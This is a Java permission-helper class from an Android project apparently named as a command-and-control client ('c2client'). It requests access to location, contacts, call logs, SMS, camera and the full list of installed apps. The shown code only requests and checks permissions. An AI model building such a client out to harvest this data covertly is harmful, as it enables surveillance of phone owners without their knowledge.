package com.astra.c2client;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class PermissionManager {
    // Permission request code
    public static final int PERMISSIONS_REQUEST_CODE = 1001;
    
    // List of all required permissions
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.CAMERA
    };
    
    // Additional permissions for Android 11+
    private static final String[] ANDROID_11_PERMISSIONS = {
        Manifest.permission.QUERY_ALL_PACKAGES
    };
    
    /**
     * Check if all required permissions are granted
     * 
     * @param context The application context
     * @return True if all permissions are granted, false otherwise
     */
    public static boolean hasAllPermissions(Context context) {
        for (String permission : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    
    /**
     * Get the list of required permissions based on Android version
     * 
     * @return Array of permission strings
     */
    public static String[] getRequiredPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Combine base permissions with Android 11+ permissions
            String[] permissions = new String[REQUIRED_PERMISSIONS.length + ANDROID_11_PERMISSIONS.length];
            System.arraycopy(REQUIRED_PERMISSIONS, 0, permissions, 0, REQUIRED_PERMISSIONS.length);
            System.arraycopy(ANDROID_11_PERMISSIONS, 0, permissions, REQUIRED_PERMISSIONS.length, ANDROID_11_PERMISSIONS.length);
            return permissions;
        } else {
            return REQUIRED_PERMISSIONS;
        }
    }
    
    /**
     * Request all required permissions
     * 
     * @param activity The activity requesting permissions
     */
    public static void requestAllPermissions(Activity activity) {
        ActivityCompat.requestPermissions(
            activity,
            getRequiredPermissions(),
            PERMISSIONS_REQUEST_CODE
        );
    }
    
    /**
     * Get list of permissions that need to be requested
     * 
     * @param context The application context
     * @return List of permissions that are not yet granted
     */
    public static List<String> getNeededPermissions(Context context) {
        List<String> neededPermissions = new ArrayList<>();
        
        for (String permission : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permission);
            }
        }
        
        return neededPermissions;
    }
    
    /**
     * Check if a specific permission is granted
     * 
     * @param context The application context
     * @param permission The permission to check
     * @return True if the permission is granted, false otherwise
     */
    public static boolean hasPermission(Context context, String permission) {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED;
    }
    
    /**
     * Get a human-readable name for a permission
     * 
     * @param permission The permission string
     * @return A human-readable name for the permission
     */
    public static String getPermissionName(String permission) {
        switch (permission) {
            case Manifest.permission.INTERNET:
                return "Internet Access";
            case Manifest.permission.ACCESS_NETWORK_STATE:
                return "Network State";
            case Manifest.permission.ACCESS_FINE_LOCATION:
                return "Precise Location";
            case Manifest.permission.ACCESS_COARSE_LOCATION:
                return "Approximate Location";
            case Manifest.permission.READ_PHONE_STATE:
                return "Phone State";
            case Manifest.permission.READ_CONTACTS:
                return "Contacts";
            case Manifest.permission.READ_CALL_LOG:
                return "Call Log";
            case Manifest.permission.READ_SMS:
                return "SMS Messages";
            case Manifest.permission.RECEIVE_SMS:
                return "Receive SMS";
            case Manifest.permission.CAMERA:
                return "Camera";
            case Manifest.permission.QUERY_ALL_PACKAGES:
                return "Query Apps";
            default:
                return permission.replace("android.permission.", "");
        }
    }
}
